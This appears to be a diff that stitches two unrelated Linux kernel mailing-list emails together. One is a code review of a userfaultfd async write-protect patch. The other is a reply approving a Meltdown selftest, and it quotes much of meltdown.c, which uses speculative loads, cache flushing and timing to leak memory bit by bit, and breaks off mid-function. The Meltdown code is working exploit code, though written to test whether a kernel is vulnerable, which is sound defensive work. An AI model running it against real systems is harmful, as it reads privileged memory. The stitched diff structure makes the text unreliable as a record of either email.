@@ -2,100 +2,71 @@ Return-Path: <linux-kselftest-owner@vger.kernel.org>
 X-Original-To: lists+linux-kselftest@lfdr.de
 Delivered-To: lists+linux-kselftest@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 8E29C673EF3
-	for <lists+linux-kselftest@lfdr.de>; Thu, 19 Jan 2023 17:36:31 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 92981673FB2
+	for <lists+linux-kselftest@lfdr.de>; Thu, 19 Jan 2023 18:16:02 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S230104AbjASQg3 (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
-        Thu, 19 Jan 2023 11:36:29 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:59742 "EHLO
+        id S229771AbjASRQB (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
+        Thu, 19 Jan 2023 12:16:01 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:58304 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229776AbjASQg0 (ORCPT
+        with ESMTP id S229886AbjASRQB (ORCPT
         <rfc822;linux-kselftest@vger.kernel.org>);
-        Thu, 19 Jan 2023 11:36:26 -0500
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id E62112690
-        for <linux-kselftest@vger.kernel.org>; Thu, 19 Jan 2023 08:35:45 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-        s=mimecast20190719; t=1674146145;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-         in-reply-to:in-reply-to:references:references;
-        bh=YqbaSkcNmu7S5CxoOj5pGxB6mLiWjQhRfKBTE8b1EMQ=;
-        b=Hlv6yY1xgzdVe6Nb2tn9pyyShoTln4XcMmQcp9DT7pnlhoy/gE9YhTESlUep4P2l5uhJq8
-        hwSJxxNTfU3H8APWAwY7zfKn/XRRiiAmot93a9LIUZ+FeKNuBcKjcLdmRpS/8N6Rlm0abV
-        WIcD2+Ps8ZAbZCIl/Sjr3f2nlm8a7V0=
-Received: from mail-vs1-f71.google.com (mail-vs1-f71.google.com
- [209.85.217.71]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_128_GCM_SHA256) id
- us-mta-275-yim-IqkJMsy63FHuGyHY4g-1; Thu, 19 Jan 2023 11:35:43 -0500
-X-MC-Unique: yim-IqkJMsy63FHuGyHY4g-1
-Received: by mail-vs1-f71.google.com with SMTP id s62-20020a675e41000000b003cefb1730d9so900290vsb.0
-        for <linux-kselftest@vger.kernel.org>; Thu, 19 Jan 2023 08:35:43 -0800 (PST)
+        Thu, 19 Jan 2023 12:16:01 -0500
+Received: from mail-oa1-x2b.google.com (mail-oa1-x2b.google.com [IPv6:2001:4860:4864:20::2b])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id CBAC7872B6;
+        Thu, 19 Jan 2023 09:15:58 -0800 (PST)
+Received: by mail-oa1-x2b.google.com with SMTP id 586e51a60fabf-1433ef3b61fso3256417fac.10;
+        Thu, 19 Jan 2023 09:15:58 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:from:to:cc:subject:date:message-id:reply-to;
+        bh=N6hpR2BLPkHwY6pg/0x14mL94POBBiSwVibIACUor70=;
+        b=jMtML7IcDNuC3W9ewyJdQiuEVO/DIB+XNRgLFDzslmykwqueUTgH8Jdlwhr/cMK9os
+         ZlLwNv6ZkPXrUPDw6ZQg+0y+k8CFTrglXmU7XcyEC1k1cYCfTs4l8TDRQVH6E49SCPsm
+         aQJkPYoICSTCsWDZqFIc/ITCC+G7QlrEBwoT4FDjVVxeUijixY/pE6MgWd7JOxK3vlyl
+         fILn2cAqz/VfliFYdIC6OHUgYTZx5Qb5bZWgmvXndbxB34Nts92rETupVlpMiPQ1M1e/
+         xmGnlGaZpaJYzBVOWtOwyp3s43KdylHswp6aNXijLpvuO6eRyl4OwJGkfvW+u019KMMv
+         vFxQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20210112;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=YqbaSkcNmu7S5CxoOj5pGxB6mLiWjQhRfKBTE8b1EMQ=;
-        b=BiZfW6C6PDoZjKQYIT8nMhNNDnCUTvXSE+MN91ansVhWSKUL548UsYVzkJxM/uHQ7W
-         SYlFAqI/qnFqhvqc4EIPi0Nl+r/hzgGHozFWR6QxoshCJlGwexuCP/KiXCjBV8qYzqn9
-         iV0m/vhd2pIzZ01v6V86vwmE9n6Q96lmpSASqiIpaRhm2Inc3A2JB7Z/TUfQSLF8Ap6c
-         PpPb5ucZA+bs0wiZIUF+Hj9zD3KpPsOMYzRdR8P2yZuTUyBA5JRc+EguYEPdSWdszGrS
-         by0oHuFw7Gr+h7uArWiOTfPSdmLvILbtN3KTh3km/ZoOPpUDNvjNSj0l+DlivayQOv66
-         N66w==
-X-Gm-Message-State: AFqh2kosdYUPZUhkHwE+UsZz9UL8N3scD/j8tePrfb7ce3xMsq4hCA1m
-        CTFrIuxdKlwn1TqQZy2Bl87BPzB7vs21xfijIi5o2MzobQCXvQumv3OHlRe4JY/u8qoc5FrFXQ9
-        DvgM1aFDRIbF7llpNGtvbPs3VhOyh
-X-Received: by 2002:a1f:3857:0:b0:3bc:3356:d850 with SMTP id f84-20020a1f3857000000b003bc3356d850mr6620850vka.10.1674146142993;
-        Thu, 19 Jan 2023 08:35:42 -0800 (PST)
-X-Google-Smtp-Source: AMrXdXteILsXVgeErNIY/rFuN71B6E7nZYmgkZen4jAWGtuSGpsljnI6cR/czP+wp6clJOsHeQ7hjw==
-X-Received: by 2002:a1f:3857:0:b0:3bc:3356:d850 with SMTP id f84-20020a1f3857000000b003bc3356d850mr6620818vka.10.1674146142566;
-        Thu, 19 Jan 2023 08:35:42 -0800 (PST)
-Received: from x1n (bras-base-aurron9127w-grc-56-70-30-145-63.dsl.bell.ca. [70.30.145.63])
-        by smtp.gmail.com with ESMTPSA id l14-20020a05620a28ce00b007062139ecb3sm12737661qkp.95.2023.01.19.08.35.40
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 19 Jan 2023 08:35:41 -0800 (PST)
-Date:   Thu, 19 Jan 2023 11:35:39 -0500
-From:   Peter Xu <peterx@redhat.com>
-To:     Muhammad Usama Anjum <usama.anjum@collabora.com>
-Cc:     David Hildenbrand <david@redhat.com>,
-        Andrew Morton <akpm@linux-foundation.org>,
-        =?utf-8?B?TWljaGHFgiBNaXJvc8WCYXc=?= <emmir@google.com>,
-        Andrei Vagin <avagin@gmail.com>,
-        Danylo Mocherniuk <mdanylo@google.com>,
-        Paul Gofman <pgofman@codeweavers.com>,
-        Cyrill Gorcunov <gorcunov@gmail.com>,
-        Alexander Viro <viro@zeniv.linux.org.uk>,
-        Shuah Khan <shuah@kernel.org>,
-        Christian Brauner <brauner@kernel.org>,
-        Yang Shi <shy828301@gmail.com>,
-        Vlastimil Babka <vbabka@suse.cz>,
-        "Liam R . Howlett" <Liam.Howlett@oracle.com>,
-        Yun Zhou <yun.zhou@windriver.com>,
-        Suren Baghdasaryan <surenb@google.com>,
-        Alex Sierra <alex.sierra@amd.com>,
-        Matthew Wilcox <willy@infradead.org>,
-        Pasha Tatashin <pasha.tatashin@soleen.com>,
-        Mike Rapoport <rppt@kernel.org>, Nadav Amit <namit@vmware.com>,
-        Axel Rasmussen <axelrasmussen@google.com>,
-        "Gustavo A . R . Silva" <gustavoars@kernel.org>,
-        Dan Williams <dan.j.williams@intel.com>,
-        linux-kernel@vger.kernel.org, linux-fsdevel@vger.kernel.org,
-        linux-mm@kvack.org, linux-kselftest@vger.kernel.org,
-        Greg KH <gregkh@linuxfoundation.org>, kernel@collabora.com
-Subject: Re: [PATCH v7 1/4] userfaultfd: Add UFFD WP Async support
-Message-ID: <Y8lxW5YtD6MX61WD@x1n>
-References: <20230109064519.3555250-1-usama.anjum@collabora.com>
- <20230109064519.3555250-2-usama.anjum@collabora.com>
- <Y8gkY8OlnOwvlkj4@x1n>
- <0bed5911-48b9-0cc2-dfcf-d3bc3b0e8388@collabora.com>
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=N6hpR2BLPkHwY6pg/0x14mL94POBBiSwVibIACUor70=;
+        b=djAjmouyH5E33h+zmGKVWzAHf10gjjYrnakJhXDDR/BH66aPcQzgwXnjFxOdvsDC/G
+         LvXFG8Jh3Wu7C5pb71SElBdDGswXDckIjVMxF6/R16zcMmkAQPpOniQjCh/ZcHfpSCk2
+         Adt1Krch9yEX2POjysva6C3i26ozDW4uYy+83f/Y0wU+McFt0tZEMDZSjzNgrLA1TG/i
+         ZIwwfnlFMgAdvvsHEGaYsqnA5F+xYEOOvryH+c7T2ZwLap8KEqIimnoJ3Dy4pGD91SO+
+         QErsTJqP88j9VUdan7H9VJkqPxTJilOe+6LI17+WrWGtlzavI+96W2TvTl5hKu+8ZriT
+         /WZw==
+X-Gm-Message-State: AFqh2kpzRI2WDv9dnKOCBrsKIntua0JcWmQpfM19NIByJmVOv9/5Eegv
+        AkREkRTY8ad6udd42qqFysfvcMQNzv5QroSJF38=
+X-Google-Smtp-Source: AMrXdXvqkFIJRfIXak/s8ZTaVr2bIMDO+Nu9mgs1ujomNuU0Ztvl0ykVBPUcU6FOw/kBOv5MLZA1rGNnS3BG/RJdJAo=
+X-Received: by 2002:a05:6870:6699:b0:15b:b80c:e3bd with SMTP id
+ ge25-20020a056870669900b0015bb80ce3bdmr843766oab.273.1674148558016; Thu, 19
+ Jan 2023 09:15:58 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-In-Reply-To: <0bed5911-48b9-0cc2-dfcf-d3bc3b0e8388@collabora.com>
-X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_NONE,
-        RCVD_IN_MSPIKE_H2,SPF_HELO_NONE,SPF_NONE autolearn=unavailable
+References: <Y7bD+R/cxZ4p/nWe@ziqianlu-desk1>
+In-Reply-To: <Y7bD+R/cxZ4p/nWe@ziqianlu-desk1>
+From:   Pavel Boldin <boldin.pavel@gmail.com>
+Date:   Thu, 19 Jan 2023 19:15:46 +0200
+Message-ID: <CABohvEO796aei7YfuLsjQZoermnyB_5Q9YcwT06PAuFdx2s+0g@mail.gmail.com>
+Subject: Re: [PATCH] selftest/x86/meltdown: Add a selftest for meltdown
+To:     Aaron Lu <aaron.lu@intel.com>
+Cc:     Dave Hansen <dave.hansen@intel.com>,
+        Pavel Boldin <pboldin@cloudlinux.com>,
+        "Raphael S. Carvalho" <raphaelsc@scylladb.com>,
+        Moritz Lipp <github@mlq.me>,
+        Daniel Gruss <daniel.gruss@iaik.tugraz.at>,
+        Michael Schwarz <michael.schwarz91@gmail.com>,
+        Greg KH <gregkh@linuxfoundation.org>,
+        linux-kselftest@vger.kernel.org, linux-kernel@vger.kernel.org,
+        Igor Seletskiy <i@cloudlinux.com>
+Content-Type: text/plain; charset="UTF-8"
+X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
+        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
         autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
@@ -103,216 +74,563 @@ Precedence: bulk
 List-ID: <linux-kselftest.vger.kernel.org>
 X-Mailing-List: linux-kselftest@vger.kernel.org
 
-On Thu, Jan 19, 2023 at 08:09:52PM +0500, Muhammad Usama Anjum wrote:
+> Signed-off-by: Aaron Lu <aaron.lu@intel.com>
+Reviewed-by: Pavel Boldin <boldin.pavel@gmail.com>
 
-[...]
+--
+Sincerely,
+Pavel Boldin
 
-> >> @@ -497,80 +498,93 @@ vm_fault_t handle_userfault(struct vm_fault *vmf, unsigned long reason)
-> >>  
-> >>  	/* take the reference before dropping the mmap_lock */
-> >>  	userfaultfd_ctx_get(ctx);
-> >> +	if (ctx->async) {
-> > 
-> > Firstly, please consider not touching the existing code/indent as much as
-> > what this patch did.  Hopefully we can keep the major part of sync uffd be
-> > there with its git log, it also helps reviewing your code.  You can add the
-> > async block before that, handle the fault and return just earlier.
-> This is possible. Will do in next revision.
-> 
-> > 
-> > And, I think this is a bit too late because we're going to return with
-> > VM_FAULT_RETRY here, while maybe we don't need to retry at all here because
-> > we're going to resolve the page fault immediately.
-> > 
-> > I assume you added this because you wanted userfaultfd_ctx_get() to make
-> > sure the uffd context will not go away from under us, but it's not needed
-> > if we're still holding the mmap read lock.  I'd expect for async mode we
-> > don't really need to release it at all.
-> I'll have to check the what should be returned here. We should return
-> something which shows that the fault has been resolved.
+P.S. Sorry for lagging, electricity & free time are hard to find these days.
 
-VM_FAULT_NOPAGE may be the best to describe it, but I guess it shouldn't
-have a difference here if to just return zero.  And, I guess you don't even
-need to worry on the retval here because I think you can leverage do_wp_page.
-More below.
-
-> 
-> > 
-> >> +		// Resolve page fault of this page
-> > 
-> > Please use "/* ... */" as that's the common pattern of commenting in the
-> > Linux kernel, at least what I see in mm/.
-> Will do.
-> 
-> > 
-> >> +		unsigned long addr = (ctx->features & UFFD_FEATURE_EXACT_ADDRESS) ?
-> >> +				      vmf->real_address : vmf->address;
-> >> +		struct vm_area_struct *dst_vma = find_vma(ctx->mm, addr);
-> >> +		size_t s = PAGE_SIZE;
-> > 
-> > This is weird - if we want async uffd-wp, let's consider huge page from the
-> > 1st day.
-> > 
-> >> +
-> >> +		if (dst_vma->vm_flags & VM_HUGEPAGE) {
-> > 
-> > VM_HUGEPAGE is only a hint.  It doesn't mean this page is always a huge
-> > page.  For anon, we can have thp wr-protected as a whole, not happening for
-> > !anon because we'll split already.
-> > 
-> > For anon, if a write happens to a thp being uffd-wp-ed, we'll keep that pmd
-> > wr-protected and report the uffd message.  The pmd split happens when the
-> > user invokes UFFDIO_WRITEPROTECT on the small page.  I think it'll stop
-> > working for async uffd-wp because we're going to resolve the page faults
-> > right away.
-> > 
-> > So for async uffd-wp (note: this will be different from hugetlb), you may
-> > want to consider having a pre-requisite patch to change wp_huge_pmd()
-> > behavior: rather than calling handle_userfault(), IIUC you can also just
-> > fallback to the split path right below (__split_huge_pmd) so the thp will
-> > split now even before the uffd message is generated.
-> I'll make the changes and make this. I wasn't aware that the thp is being
-> broken in the UFFD WP. At this time, I'm not sure if thp will be handled by
-> handle_userfault() in one go. Probably it will as the length is stored in
-> the vmf.
-
-Yes I think THP can actually be handled in one go with uffd-wp anon (even
-if vmf doesn't store any length because page fault is about address only
-not length, afaict).  E.g. thp firstly get wr-protected in thp size, then
-when unprotect the user app sends UFFDIO_WRITEPROTECT(wp=false) with a
-range covering the whole thp.
-
-But AFAIU that should be quite rare because most uffd-wp scenarios are
-latency sensitive, resolving page faults in large chunk definitely enlarges
-that.  It could happen though when it's not resolving an immediate page
-fault, so it could happen in the background.
-
-So after a second thought, a safer approach is we only go to the split path
-if async is enabled, in wp_huge_pmd().  Then it doesn't need to be a
-pre-requisite patch too, it can be part of the major patch to implement the
-uffd-wp async mode.
-
-> 
-> > 
-> > I think it should be transparent to the user and it'll start working for
-> > you with async uffd-wp here, because it means when reaching
-> > handle_userfault, it should not be possible to have thp at all since they
-> > should have all split up.
-> > 
-> >> +			s = HPAGE_SIZE;
-> >> +			addr &= HPAGE_MASK;
-> >> +		}
-> >>  
-> >> -	init_waitqueue_func_entry(&uwq.wq, userfaultfd_wake_function);
-> >> -	uwq.wq.private = current;
-> >> -	uwq.msg = userfault_msg(vmf->address, vmf->real_address, vmf->flags,
-> >> -				reason, ctx->features);
-> >> -	uwq.ctx = ctx;
-> >> -	uwq.waken = false;
-> >> -
-> >> -	blocking_state = userfaultfd_get_blocking_state(vmf->flags);
-> >> +		ret = mwriteprotect_range(ctx->mm, addr, s, false, &ctx->mmap_changing);
-> > 
-> > This is an overkill - we're pretty sure it's a single page, no need to call
-> > a range function here.
-> Probably change_pte_range() should be used here to directly remove the WP here?
-
-Here we can persue the best performance, or we can also persue the easist
-way to implement.  I think the best we can have is we don't release either
-the mmap read lock _and_ the pgtable lock, so we resolve the page fault
-completely here.  But that requires more code changes.
-
-So far an probably intermediate (and very easy to implement) solution is:
-
-(1) Remap the pte (vmf->pte) and retake the lock (vmf->ptl).  Note: you
-    need to move the chunk to be before mmap read lock released first,
-    because we'll need that to make sure pgtable lock and the pgtable page
-    being still exist at the first place.
-
-(2) If *vmf->pte != vmf->orig_pte, it means the pgtable changed, retry
-    (with VM_FAULT_NOPAGE).  We must have orig_pte set btw in this path.
-
-(2) Remove the uffd-wp bit if it's set (and it must be set, because we
-    checked again on orig_pte with pgtable lock held).
-
-(3) Invoke do_wp_page() again with the same vmf.
-
-This will focus the resolution on the single page and resolve CoW in one
-shot if needed.  We may need to redo the map/lock of pte* but I suppose it
-won't hurt a lot if we just modified the fields anyway, so we can leave
-that for later.
-
-[...]
-
-> > Then when the app wants to wr-protect in async mode, it simply goes ahead
-> > with UFFDIO_WRITEPROTECT(wp=true), it'll happen exactly the same as when it
-> > was sync mode.  It's only the pf handling procedure that's different (along
-> > with how the fault is reported - rather than as a message but it'll be
-> > consolidated into the soft-dirty bit).
-> PF handling will resovle the fault after un-setting the _PAGE_*_UFFD_WP on
-> the page. I'm not changing the soft-dirty bit. It is too delicate (if you
-> get the joke).
-
-It's unfortunate that the old soft-dirty solution didn't go through easily.
-Soft-dirty still covers something that uffd-wp cannot do right now, e.g. on
-tracking mostly any type of pte mappings.  Uffd-wp can so far only track
-fully ram backed pages like shmem or hugetlb for files but not any random
-page cache.  Hopefully it still works at least for your use case, or it's
-time to rethink otherwise.
-
-> 
-> > 
-> >>  
-> >>  	if (mode_wp && mode_dontwake)
-> >>  		return -EINVAL;
-> >> @@ -2126,6 +2143,7 @@ static int new_userfaultfd(int flags)
-> >>  	ctx->flags = flags;
-> >>  	ctx->features = 0;
-> >>  	ctx->released = false;
-> >> +	ctx->async = false;
-> >>  	atomic_set(&ctx->mmap_changing, 0);
-> >>  	ctx->mm = current->mm;
-> >>  	/* prevent the mm struct to be freed */
-> >> diff --git a/include/uapi/linux/userfaultfd.h b/include/uapi/linux/userfaultfd.h
-> >> index 005e5e306266..b89665653861 100644
-> >> --- a/include/uapi/linux/userfaultfd.h
-> >> +++ b/include/uapi/linux/userfaultfd.h
-> >> @@ -284,6 +284,11 @@ struct uffdio_writeprotect {
-> >>   * UFFDIO_WRITEPROTECT_MODE_DONTWAKE: set the flag to avoid waking up
-> >>   * any wait thread after the operation succeeds.
-> >>   *
-> >> + * UFFDIO_WRITEPROTECT_MODE_ASYNC_WP: set the flag to write protect a
-> >> + * range, the flag is unset automatically when the page is written.
-> >> + * This is used to track which pages have been written to from the
-> >> + * time the memory was write protected.
-> >> + *
-> >>   * NOTE: Write protecting a region (WP=1) is unrelated to page faults,
-> >>   * therefore DONTWAKE flag is meaningless with WP=1.  Removing write
-> >>   * protection (WP=0) in response to a page fault wakes the faulting
-> >> @@ -291,6 +296,7 @@ struct uffdio_writeprotect {
-> >>   */
-> >>  #define UFFDIO_WRITEPROTECT_MODE_WP		((__u64)1<<0)
-> >>  #define UFFDIO_WRITEPROTECT_MODE_DONTWAKE	((__u64)1<<1)
-> >> +#define UFFDIO_WRITEPROTECT_MODE_ASYNC_WP	((__u64)1<<2)
-> >>  	__u64 mode;
-> >>  };
-> >>  
-> >> -- 
-> >> 2.30.2
-> >>
-> > 
-> 
-> I should have added Suggested-by: Peter Xy <peterx@redhat.com> to this
-> patch. I'll add in the next revision if you don't object.
-
-I'm fine with it.  If so, please do s/Xy/Xu/.
-
-> 
-> I've started working on next revision. I'll reply to other highly valuable
-> review emails a bit later.
-
-Thanks,
-
--- 
-Peter Xu
-
+> diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
+> index 0388c4d60af0..36f99c360a56 100644
+> --- a/tools/testing/selftests/x86/Makefile
+> +++ b/tools/testing/selftests/x86/Makefile
+> @@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
+>  TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
+>                         check_initial_reg_state sigreturn iopl ioperm \
+>                         test_vsyscall mov_ss_trap \
+> -                       syscall_arg_fault fsgsbase_restore sigaltstack
+> +                       syscall_arg_fault fsgsbase_restore sigaltstack meltdown
+>  TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
+>                         test_FCMOV test_FCOMI test_FISTTP \
+>                         vdso_restorer
+> diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
+> new file mode 100644
+> index 000000000000..fcb211dc9038
+> --- /dev/null
+> +++ b/tools/testing/selftests/x86/meltdown.c
+> @@ -0,0 +1,529 @@
+> +// SPDX-License-Identifier: GPL-2.0-or-later
+> +/*
+> + * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
+> + * https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c
+> + */
+> +
+> +#define _GNU_SOURCE
+> +#include <stdio.h>
+> +#include <stdlib.h>
+> +#include <stdint.h>
+> +#include <stdarg.h>
+> +#include <string.h>
+> +#include <signal.h>
+> +#include <ucontext.h>
+> +#include <unistd.h>
+> +#include <fcntl.h>
+> +#include <ctype.h>
+> +#include <sys/utsname.h>
+> +#include <sys/mman.h>
+> +
+> +#define PAGE_SHIFT     12
+> +#define PAGE_SIZE      0x1000
+> +#define PUD_SHIFT       30
+> +#define PUD_SIZE        (1UL << PUD_SHIFT)
+> +#define PUD_MASK        (~(PUD_SIZE - 1))
+> +
+> +size_t cache_miss_threshold;
+> +unsigned long directmap_base;
+> +
+> +#define TARGET_OFFSET  9
+> +#define TARGET_SIZE    (1 << TARGET_OFFSET)
+> +#define BITS_BY_READ   2
+> +
+> +static inline uint64_t rdtsc(void)
+> +{
+> +       uint32_t eax, edx;
+> +       uint64_t tsc_val;
+> +       /*
+> +        * The lfence is to wait (on Intel CPUs) until all previous
+> +        * instructions have been executed. If software requires RDTSC to be
+> +        * executed prior to execution of any subsequent instruction, it can
+> +        * execute LFENCE immediately after RDTSC
+> +        *                                              */
+> +       __asm__ __volatile__("lfence; rdtsc; lfence" : "=a"(eax), "=d"(edx));
+> +       tsc_val = ((uint64_t)edx) << 32 | eax;
+> +       return tsc_val;
+> +}
+> +
+> +static inline void clflush(volatile void *__p)
+> +{
+> +       asm volatile("clflush %0" : "+m" (*(volatile char *)__p));
+> +}
+> +
+> +static char target_array[BITS_BY_READ * TARGET_SIZE];
+> +
+> +static void clflush_target(void)
+> +{
+> +       int i;
+> +
+> +       for (i = 0; i < BITS_BY_READ; i++)
+> +               clflush(&target_array[i * TARGET_SIZE]);
+> +}
+> +
+> +extern char failshere[];
+> +extern char stopspeculate[];
+> +
+> +static void __attribute__((noinline)) speculate(unsigned long addr, char bit)
+> +{
+> +       register char mybit asm ("cl") = bit;
+> +#ifdef __x86_64__
+> +       asm volatile (
+> +               "1:\n\t"
+> +
+> +               ".rept 300\n\t"
+> +               "add $0x141, %%rax\n\t"
+> +               ".endr\n"
+> +
+> +               "failshere:\n\t"
+> +               "movb (%[addr]), %%al\n\t"
+> +               "ror %[bit], %%rax\n\t"
+> +               "and $1, %%rax\n\t"
+> +               "shl $9, %%rax\n\t"
+> +               "jz 1b\n\t"
+> +
+> +               "movq (%[target], %%rax, 1), %%rbx\n"
+> +
+> +               "stopspeculate: \n\t"
+> +               "nop\n\t"
+> +               :
+> +               : [target] "r" (target_array),
+> +                 [addr] "r" (addr),
+> +                 [bit] "r" (mybit)
+> +               : "rax", "rbx"
+> +       );
+> +#else /* defined(__x86_64__) */
+> +       asm volatile (
+> +               "1:\n\t"
+> +
+> +               ".rept 300\n\t"
+> +               "add $0x141, %%eax\n\t"
+> +               ".endr\n"
+> +
+> +               "failshere:\n\t"
+> +               "movb (%[addr]), %%al\n\t"
+> +               "ror %[bit], %%eax\n\t"
+> +               "and $1, %%eax\n\t"
+> +               "shl $9, %%eax\n\t"
+> +               "jz 1b\n\t"
+> +
+> +               "movl (%[target], %%eax, 1), %%ebx\n"
+> +
+> +               "stopspeculate: \n\t"
+> +               "nop\n\t"
+> +               :
+> +               : [target] "r" (target_array),
+> +                 [addr] "r" (addr),
+> +                 [bit] "r" (mybit)
+> +               : "rax", "ebx"
+> +       );
+> +#endif
+> +}
+> +
+> +#ifdef __i386__
+> +# define REG_RIP       REG_EIP
+> +#endif
+> +
+> +static void sigsegv(int sig, siginfo_t *siginfo, void *context)
+> +{
+> +       ucontext_t *ucontext = context;
+> +       unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
+> +       if (*prip != (unsigned long)failshere) {
+> +               printf("Segmentation fault at unexpected location %lx\n", *prip);
+> +               abort();
+> +       }
+> +       *prip = (unsigned long)stopspeculate;
+> +       return;
+> +}
+> +
+> +static int set_signal(void)
+> +{
+> +       struct sigaction act = {
+> +               .sa_sigaction = sigsegv,
+> +               .sa_flags = SA_SIGINFO,
+> +       };
+> +
+> +       return sigaction(SIGSEGV, &act, NULL);
+> +}
+> +
+> +static inline int get_access_time(volatile char *addr)
+> +{
+> +       unsigned long long time1, time2;
+> +       volatile int j __attribute__((__unused__));
+> +
+> +       time1 = rdtsc();
+> +       j = *addr;
+> +       time2 = rdtsc();
+> +
+> +       return time2 - time1;
+> +}
+> +
+> +static int cache_hit_threshold;
+> +static int hist[BITS_BY_READ];
+> +
+> +static void check(void)
+> +{
+> +       int i, time;
+> +       volatile char *addr;
+> +
+> +       for (i = 0; i < BITS_BY_READ; i++) {
+> +               addr = &target_array[i * TARGET_SIZE];
+> +
+> +               time = get_access_time(addr);
+> +
+> +               if (time <= cache_hit_threshold)
+> +                       hist[i]++;
+> +       }
+> +}
+> +
+> +#define CYCLES 10000
+> +static int readbit(int fd, unsigned long addr, char bit)
+> +{
+> +       int i, ret;
+> +       static char buf[256];
+> +
+> +       memset(hist, 0, sizeof(hist));
+> +
+> +       for (i = 0; i < CYCLES; i++) {
+> +               /*
+> +                * Make the to-be-stolen data cache and tlb hot
+> +                * to increase success rate.
+> +                */
+> +               ret = pread(fd, buf, sizeof(buf), 0);
+> +               if (ret < 0)
+> +                       printf("[INFO]\tCan't read fd");
+> +
+> +               clflush_target();
+> +
+> +               speculate(addr, bit);
+> +               check();
+> +       }
+> +
+> +       if (hist[1] > CYCLES / 10)
+> +               return 1;
+> +       return 0;
+> +}
+> +
+> +static int readbyte(int fd, unsigned long addr)
+> +{
+> +       int bit, res = 0;
+> +
+> +       for (bit = 0; bit < 8; bit ++ )
+> +               res |= (readbit(fd, addr, bit) << bit);
+> +
+> +       return res;
+> +}
+> +
+> +static int mysqrt(long val)
+> +{
+> +       int root = val / 2, prevroot = 0, i = 0;
+> +
+> +       while (prevroot != root && i++ < 100) {
+> +               prevroot = root;
+> +               root = (val / root + root) / 2;
+> +       }
+> +
+> +       return root;
+> +}
+> +
+> +#define ESTIMATE_CYCLES        1000000
+> +static void set_cache_hit_threshold(void)
+> +{
+> +       long cached, uncached, i;
+> +
+> +       for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+> +               cached += get_access_time(target_array);
+> +
+> +       for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+> +               cached += get_access_time(target_array);
+> +
+> +       for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
+> +               clflush(target_array);
+> +               uncached += get_access_time(target_array);
+> +       }
+> +
+> +       cached /= ESTIMATE_CYCLES;
+> +       uncached /= ESTIMATE_CYCLES;
+> +
+> +       cache_hit_threshold = mysqrt(cached * uncached);
+> +
+> +       printf("[INFO]\taccess time: cached = %ld, uncached = %ld, threshold = %d\n",
+> +               cached, uncached, cache_hit_threshold);
+> +}
+> +
+> +static unsigned long find_symbol_in_file(const char *filename, const char *symname)
+> +{
+> +       unsigned long addr;
+> +       char type, *buf;
+> +       int found;
+> +       FILE *fp;
+> +
+> +       fp = fopen(filename, "r");
+> +       if (!fp) {
+> +               printf("[INFO]\tFailed to open %s\n", filename);
+> +               return 0;
+> +       }
+> +
+> +       buf = malloc(4096);
+> +       if (!buf)
+> +               return 0;
+> +
+> +       found = 0;
+> +       while (fscanf(fp, "%lx %c %s\n", &addr, &type, buf)) {
+> +               if (!strcmp(buf, symname)) {
+> +                       found = 1;
+> +                       break;
+> +               }
+> +       }
+> +
+> +       free(buf);
+> +       fclose(fp);
+> +
+> +       return found ? addr : 0;
+> +}
+> +
+> +static unsigned long find_kernel_symbol(const char *name)
+> +{
+> +       char systemmap[256];
